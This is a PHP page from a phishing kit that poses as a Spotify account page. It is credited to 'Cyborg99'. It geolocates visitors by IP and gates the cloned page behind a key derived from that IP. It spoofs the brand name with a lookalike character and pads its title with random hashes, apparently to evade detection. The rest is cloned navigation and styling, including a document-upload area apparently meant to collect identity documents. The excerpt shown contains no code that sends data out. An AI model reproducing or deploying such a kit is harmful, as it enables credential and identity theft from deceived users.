<?php @error_reporting(0);
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
include'../proxy.php';
$rand = dechex(rand(0x000000, 0xFFFFFF));
$host = isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'localhost';
$bert=md5 (rand(0,10000));
$bero=md5 (rand(0,100000));
$bero1=md5 (rand(0,10000));
$bero2=md5 (rand(0,10000));
$bero3=md5 (rand(0,1000));
$bero4=md5 (rand(0,1000));
$bero5=md5 (rand(0,100000));
$bero6=md5 (rand(0,10000));
$bert4=md5 (rand(0,1000));
require "../lang.php";
#################################################################################################################################
		$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
#################################################################################################################################
$dota = str_replace(".", "", $IP);
$zd = 'e';
$runa = $zd . '' . $dota;
$setting = parse_ini_file('../conf.pak'); 
        $gettfe = $setting['ids']; 
        if($gettfe == 1) 
        {$CODED  ="vb?$rand=".$bert."&d$dota&country=".$COUNTRYCODE."&".md5(microtime())."&$dota&s=".sha1(microtime());
	    header("Location: $CODED");
        }else{}
?>

<?php
if(isset($_GET[$runa]))
{
?>
<html id="app" lang="en" dir="ltr" class="ng-scope"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title class="ng-binding"><?php echo $abtn; ?> - Spotıfy (<?php echo $COUNTRYCODE; ?>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $bert; ?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link href="../libs/index.css" media="screen" rel="stylesheet">
  <link rel="icon" href="data:image/x-icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP2TExj/ExMY/xMTGP8TExj/ExMY/xMTGP1TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhBExMYgRMTGL8TExi/ExMY7xMTGN8TExi/ExMYvxMTGIETExhB////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYgRMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///4B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM4TExgR////Af///wH///9B////Af///wH///8B////Af///wH///8BExMYMRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgx////Af///wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP7TExj/ExMY/xMTGP9TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8BExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM////8B////Af///wH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIH///8B////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP7TExj/ExMY/xMTGP3TExjPExMY/xMTGP9TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP1TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExifExMYIf///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wH///8BExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgRMTGIETExivExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGJ8TExhhExMYEf///wETExgRExMYjxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjv////ARMTGEETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExgx////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgxExMYnxMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExhBExMYgRMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYnxMTGIETExhhExMYQRMTGEETExhBExMYYRMTGIETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIETExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYnxMTGCETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYcRMTGCH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wETExghExMYURMTGIETExiBExMYvxMTGL8TExifExMYgRMTGIETExhBExMYEf///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExiP////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExifExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY3xMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYrxMTGIETExhBExMYQRMTGEETExhBExMYQRMTGEETExhRExMYgRMTGK8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYzxMTGP8TExj/ExMY/xMTGP8TExi/ExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYYf///wH///8BExMYvxMTGP8TExj/ExMY/xMTGL8TExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY3xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExiPExMYQf///wH///8B////Af///wETExi/ExMY/xMTGP8TExj/ExMYgRMTGEETExj/ExMY/xMTGP8TExj/ExMYcf///wH///8BExMYIRMTGEETExiBExMYgRMTGIETExiBExMYgRMTGIETExiBExMYYRMTGEETExgR////Af///wH///8B////Af///wETExghExMYrxMTGP8TExj/ExMY/xMTGP8TExhB////ARMTGO8TExj/ExMY/xMTGP8TExhh////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhRExMYrxMTGP8TExj/ExMY/xMTGP8TExj/ExMY7////wH///8BExMYgRMTGP8TExj/ExMY/xMTGP8TExifExMYYRMTGDH///8B////Af///wH///8B////Af///wH///4B////Af///wETExgRExMYQRMTGHETExivExMY7xMTGP6TExj/ExMY/xMTGP3TExj/ExMY/xMTGP8TExiB////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYvxMTGL8TExi/ExMYvxMTGL8TExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////Af///wETExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wH///8B////Af///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYz////wH///1B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8B////ARMTGDETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYMf///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYzxMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP2TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYgRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIETExgR////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExiBExMYvxMTGL8TExjvExMY7xMTGL8TExi/ExMYgRMTGEH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@8"></script>
<script></script></head>
<body>

<header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
<span class="sr-only"><?php echo $bert; ?></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<ul class="nav">
<li class="dropdown">
<a onclick="geo()" class="user-link dropdown-toggle hidden-xs hidden-sm"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<a onclick="geo()" class="user-link hidden-md hidden-lg"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<ul class="dropdown-menu dropdown-menu-right">
<li><a></a></li>
<li><a></a></li>
</ul>
</li>
</ul>
<a onclick="geo()" class="user-link hidden"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<a class="navbar-brand"><span class="navbar-logo"><?php echo $bert; ?></span></a>
</div>
<div class="collapse navbar-collapse" id="navbar-nav">
<ul class="nav navbar-nav navbar-right"><li class="sidepanel-item-large hidden-md hidden-lg "></li>
<li class="sidepanel-item-large hidden-md hidden-lg "></li>
<li class="dropdown alternate hidden-sidepanel">
<a onclick="geo()" class="user-link dropdown-toggle">
<div class="user-icon-container img-circle navbar-user-img">
<svg class="user-icon"><use xlink:href="#user-icon"></use><svg id="user-icon" viewBox="0 0 1024 1024"> <path d="m730.06 679.64q-45.377 53.444-101.84 83.443t-120 29.999q-64.032 0-120.75-30.503t-102.6-84.451q-40.335 13.109-77.645 29.747t-53.948 26.722l-17.142 10.084q-29.747 19.159-51.175 57.729t-21.428 73.107 25.461 59.242 60.754 24.705h716.95q35.293 0 60.754-24.705t25.461-59.242-21.428-72.603-51.679-57.225q-6.554-4.033-18.907-10.84t-51.427-24.453-79.409-30.755zm-221.84 25.72q-34.285 0-67.561-14.873t-60.754-40.335-51.175-60.502-40.083-75.124-25.461-84.451-9.075-87.728q0-64.032 19.915-116.22t54.452-85.964 80.67-51.931 99.072-18.151 99.072 18.151 80.67 51.931 54.452 85.964 19.915 116.22q0 65.04-20.167 130.58t-53.948 116.72-81.426 83.443-98.568 32.268z"></path> </svg></div>
<span class="user-text"><?php echo $profidosicv; ?></span>
<svg class="svg-chevron-down"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use></svg>
</a>
</li>
</ul>
</div>
</div>
</header>
<style>

*,*:before,*:after{box-sizing:border-box;}
.hide{display:none!important;}
.contents{max-width:1024px;margin:0 auto;padding:72px 0 8rem;position:relative;}
@media (max-width:768px){
.contents{padding-top:0;}
}
.bt{color: #fff; background-color: #1db954;font-size: 14px; line-height: 1; border-radius: 500px; padding: 16px 48px 18px; transition-property: background-color,border-color,color,box-shadow,filter; transition-duration: .3s; border-width: 0; letter-spacing: 2px; min-width: 160px; text-transform: uppercase; white-space: normal;}
.bt:hover,.bt:focus{background-color:#0dd854;border:1px solid #0dd854;box-shadow:none;text-decoration:none;color:#ffffff;}
.bt:focus{outline:none;text-decoration:underline;}
h1{font-size:2.5rem;line-height:1.2;font-weight:200;text-transform:none;font-family:'p_big_sans',sans-serif;margin:15px;}
p,li,label,input{;line-height:1.6;font-weight:500;text-transform:none;font-family:pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;letter-spacing:0.025em;}
ul,ol{padding:0;margin:0 0 0.8rem 25px;}
li{line-height:1.6;}
a,a:visited{color:#0070ba;text-decoration:none;font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500;}
a:active,a:focus,a:hover{color:#005ea6;text-decoration:underline;}
p > a,li > a{font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500;}
ul,ol{margin:0 0 0.8px 25px;}
.mainContainer{position:relative;min-height:100%;width:100%;margin:0 auto;left:0;right:0;top:0;z-index:800;-webkit-transition:left 250ms,right 250ms;-o-transition:left 250ms,right 250ms;transition:left 250ms,right 250ms;}
@media (max-width:768px){
.mainContainer{width:100%;min-height:100%;}
}
.mobileNav{padding:0;min-height:72px;max-height:84px;border-bottom:1px solid #0070ba;background-color:#0070ba;background-image:linear-gradient(100deg,#0070ba,#1546a0);}
.mobileNav{display:none;}
.menuLabel{border:none;}
.menuLabel:hover{border:none;background-color:transparent;box-shadow:none;text-decoration:none;}
.notifTxt{display:block;position:relative;padding:2.1rem 0.7rem 0;opacity:0.85;-webkit-transition:opacity .3s;-o-transition:opacity .3s;transition:opacity .3s;}
.notifTxt.svgLogo{padding-top:3.4rem!important;}
.notifTxt:hover{opacity:1;text-decoration:none;}
.notifTxt.svgLogo{padding-top:3.4rem!important;}
.blockToggler{display:block;width:30%;}
.menuLabel{margin:0;position:relative;display:block;cursor:pointer;padding-top:30px;min-height:72px;max-height:84px;}
.menuLabel span{display:block;top:0;width:28px;height:1px;margin:0 auto;background-color:#fff;position:relative;}
.menuLabel span:after,.menuLabel span:before{display:block;content:'';position:absolute;width:28px;height:1px;background-color:#fff;-webkit-transition:transform .2s linear .2s,margin .2s linear .2s;-o-transition:transform .2s linear .2s,margin .2s linear .2s;transition:transform .2s linear .2s,margin .2s linear .2s;}
.menuLabel span:before{margin-top:-8px;}
.menuLabel span:after{margin-top:8px;}
.menuOpen,.menuClose{display:block;margin-top:14px;left:0;color:#fff;font-size:0.625rem;text-align:center;text-transform:uppercase;}
.menuClose{display:none;}
@media (min-width:768px) and (max-width:950px){
.notifTxt{padding:2.1rem 0.7rem 0;}
.notifTxt.svgLogo{padding-top:3.4rem!important;}
}
@media (max-width:768px){
.mobileNav{display:table;width:100%;}
.menuToggler:checked~.mainContainer{position:fixed;left:50%;right:-50%;top:0;}
.menuToggler:checked~.mainContainer .menuLabel span{background-color:transparent;}
.menuToggler:checked~.mainContainer .menuLabel span:before,.menuToggler:checked~.mainContainer .menuLabel span:after{margin-top:0;}
.menuToggler:checked~.mainContainer .menuLabel span:before{-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg);-ms-transform:rotate(45deg);-o-transform:rotate(45deg);transform:rotate(45deg);}
.menuToggler:checked~.mainContainer .menuLabel span:after{-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-ms-transform:rotate(-45deg);-o-transform:rotate(-45deg);transform:rotate(-45deg);}
.menuToggler:checked~.mainContainer .menuLabel .menuOpen{display:none;}
.menuToggler:checked~.mainContainer .menuLabel .menuClose{display:block;}
.mobileNav{display:table;}
.navHeader,.navLogo,.notifUl{display:table-cell;vertical-align:top;}
.navHeader,.notifUl{width:30%;}
.navLogo{text-align:center;}
.notifUl{text-align:right;list-style:none;margin:0;padding:0;}
.notifUl li{display:inline-block;vertical-align:top;margin-right:10px;}
.mobileBrand{display:inline-block;vertical-align:top;padding:3.4rem!important 0 1rem;}
.mobileBrand:before{content:url(http://www.cynthiagreb.com/spotfy/files/pics/logo.svg);}
}
@media (max-width:640px){
.menuToggler:checked~.mainContainer{left:50%;}
.blockToggler{width:40%;}
}
@media (max-width:479px){
.menuToggler:checked~.mainContainer{left:78%;}
.blockToggler{width:60%;}
}
@media (max-width:320px){
.menuToggler:checked~.mainContainer{left:80%;}
}
.ftr{position:absolute;width:100%;min-height:8rem;top:100%;margin-top:-8rem;border-top:1px solid #fff;background:#fff;color:#9da3a6;text-shadow:0 1px 1px #fff;}
.ftr a:hover,.ftr a:focus{text-shadow:none;}
.footerFirstContent{max-width:1024px;margin:0 auto;padding:1.5rem 1.5rem;}
.footerList,.footerUl{margin:0;}
.footerList li,.footerUl li{display:inline-block;vertical-align:top;}
.footerList a,.footerUl a{display:block;padding:1rem 0.75rem 0.75rem;font-weight:400;}
.footerList a:hover,.footerUl a:hover,.footerList a:focus,.footerUl a:focus,.footerList a:active,.footerUl a:active{color:#2c2e2f;}
.footerList li:first-child a{padding-left:0;}
.footerList a{font-family:font-family:pp-sans-small-light,Helvetica;font-size:.9375rem;color:#6c7378;text-decoration:none;text-transform:uppercase;}
.footerList a:hover{text-decoration:underline;}
.footerSecondContent{width:100%;border-top:1px dotted #9da3a6;text-align:right;}
.footerP,.footerUl{display:inline-block;vertical-align:top;}
.footerUl{margin-left:0.75rem;font-size:.6875rem;}
.footerUl li{display:inline-block;vertical-align:top;}
.footerUl li:last-child{padding-right:0;}
.footerUl li:last-child a{padding-right:0;}
.footerUl a{font-size:.6875rem;padding:1.1rem 0.75rem 0.75rem;color:#9da3a6;}
.footerP{margin-top:1rem;padding-left:0.65rem;font-size:.6875rem;}
.footerP{color:#9da3a6;font-family:pp-sans-small-light,Helvetica Neue,Arial,sans-serif;font-weight:500;letter-spacing:0.05rem;}
.footerP:after{content:"|";display:inline-block;padding-left:1.5rem;vertical-align:-0.1rem;font-weight:300;font-size:1.2rem;line-height:1em;}
@media (min-width:641px) and (max-width:950px){
.footerUl li{padding:0;}
}
@media (max-width:641px){
.footerUl,.footerP{padding-left:0;margin-left:0;}
.footerP{text-align:left;display:block;margin-top:1.5rem;}
.footerP:after{content:"";}
.footerUl{display:block;text-align:left;}
.footerUl li:first-child a{padding-left:0;}
}
.mainContents{text-align:center;width:600px;padding-bottom:0;background-color:#fff;background-clip:content-box;-ms-transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0);-webkit-backface-visibility:hidden;margin:0 auto;overflow:hidden;}
@media (max-width:617px){
.mainContents{width:100%!important;}
}
@media (max-width:617px){
h1{font-size:2em!important;}
}
.overlay{content:"";height:100%;width:100%;position:absolute;top:0;left:0;z-index:16;-moz-opacity:.9;-khtml-opacity:.9;-webkit-opacity:.9;opacity:.9;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(opacity=90);filter:alpha(opacity=90);background-color:#fff;}
.processing,.rotate{margin:auto;top:0;left:0;right:0;bottom:0;}
.processing{top:130px;height:17px;width:100%;text-align:center;position:absolute;z-index:17;font-size:15px;font-family:pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;font-weight:400;font-variant:normal;}
.dropzone-main{border:2px dashed #dee3e7;border-radius:3px;padding:15px;margin-top:20px;width:100%;height:auto;text-align:center;background:#f0f2f4;cursor:pointer;transition:background 300ms ease,border 300ms ease;}
.dropzone-main:hover{background:#e7eaee;border-color:#c0cad2;}
.dropzone-main .dropzone-img{background-image:url(lib/pics/img-upload.svg),none;background-position:0 0;margin-top:-85px;width:86px;height:78px;position:relative;top:88px;left:50%;margin-left:-43px;transition:all .15s ease;animation:move 1s linear infinite;}
.dropzone-main p{margin-top:90px;margin-bottom:0;color:#8495a4;font-size:16px;}
.dropzone-main p b{font-size:28px;color:#677683;font-weight:700;display:block;margin-bottom:10px;}
.imagesArea{margin-top:20px;width:100%;text-align:left;}
.imgItem{position:relative;margin-right:3%;margin-bottom:15px;width:100%;display:inline-block;-webkit-box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 1px 1px rgba(0,0,0,.16);-moz-box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 1px 1px rgba(0,0,0,.16);box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 1px 1px rgba(0,0,0,.16);border-radius:2px;-moz-border-radius:2px;-webkit-border-radius:2px;-moz-background-clip:padding;-webkit-background-clip:padding-box;background-clip:padding-box;overflow:hidden;max-width:169px;max-height:100px;}
.imgItem img{width:100%;vertical-align:middle;position:relative;z-index:2;-webkit-opacity:1;-moz-opacity:1;opacity:1;-ms-filter:"alpha(Opacity=0)";-webkit-transition:opacity .2s ease 0s,filter .2s ease 0s;-moz-transition:opacity .2s ease 0s,filter .2s ease 0s;-ms-transition:opacity .2s ease 0s,filter .2s ease 0s;-o-transition:opacity .2s ease 0s,filter .2s ease 0s;-webkit-transform:translateZ(0);-moz-transform:translateZ(0);-ms-transform:translateZ(0);-o-transform:translateZ(0);width:170px;height:100px;}
.imgItem:hover img{-webkit-opacity:.75;-moz-opacity:.75;opacity:.75;-ms-filter:"alpha(Opacity=0)";}
.btDel{display:none;}
.imgItem:hover .btDel{display:block;color:#000;position:absolute;top:35%;left:50%;z-index:999999999;background:none;border:none;transform:translate(-50%);border:none;border-radius:100%;padding:9px 12px;background:#f31633;color:#fff;}
.proof{cursor:default;opacity:1;background:#f5f7fa;border-radius:4px;overflow:hidden;display:table;width:100%;padding:0;height:30px;margin:0 0 8px;}
.proof li{display:table-cell;vertical-align:top;text-align:center;position:relative;-webkit-box-sizing:border-box;box-sizing:border-box;height:30px;padding:0 8px 13px;-webkit-transition:background-color 200ms linear,color 200ms linear;transition:background-color 200ms linear,color 200ms linear;font-size:14px;color:#fff;background:#000000;width:33.3333%;vertical-align:middle;}
.proof li:not(.current){background:transparent;color:#a9a9a9;}
.proof li::after{content:"";display:block;position:absolute;width:0;height:0;right:-10px;top:0;border-style:solid;border-width:15px 0 15px 10px;border-color:transparent;-webkit-transition:border-color 200ms linear;transition:border-color 200ms linear;}
@media (max-width:425px){
.proof{height:50px;}
.proof li::after{border-width:25px 0 25px 10px;}
}
@media (max-width:280px){
.proof{height:50px;}
.proof li::after{border-width:35px 0 35px 10px;}
}
.proof li.current::after{border-color:transparent transparent transparent #1aa34a;}
.proof li .ui-text-small{font-size:13px;line-height:19px;position:relative;top:6px;letter-spacing:1.2px;}
.back{font-size:12px;text-transform:uppercase;letter-spacing:1.5px;}
.doc_type{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;padding:0 calc(16.66667% + 1px);margin-bottom:30px;}
.doc_type_choice{width:calc(calc(25% + 1.5px) - 80px);}
.doc_type_choice_wrapper{display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:stretch;-ms-flex-align:stretch;align-items:stretch;text-align:center;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:175px;padding-bottom:3px;margin-left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%);}
@media (max-width:515px){
.doc_type{display:block;}
.doc_type_choice{width:unset;}
}
.cont{display:block;position:relative;cursor:pointer;user-select:none;margin-top:17px;}
.cont input{position:absolute;opacity:0;cursor:pointer;}
.checkmark{width:14px;height:14px;display:inline-flex;border:solid 1px #0070ba;border-radius:50%;}
.cont:hover input ~ .checkmark{background-color:#f5f7fa;}
.checkmark:after{content:"";display:none;width:8px;height:8px;margin-left:2px;margin-top:2px;border-radius:50%;-webkit-transition:background 0.1s ease-in-out;transition:background 0.1s ease-in-out;}
.cont input:checked ~ .checkmark:after{display:block;}
.cont .checkmark:after{background:#0070ba;}
.rules{min-height:100px;border-radius:16px;background-color:rgba(216,216,216,0.1);border:solid 1px #ccc;margin-bottom:20px;}
.rules::before,.rules::after{content:' ';display:table;}
.rules:after{clear:both;}
.rule{margin:30px 0;padding:0 10px;line-height:1.25em;}
@media (min-width:1012px){
.rule{width:33.33333333%;float:left;}
}
.rule div{font-size:17px;}
/*! CSS Used keyframes */
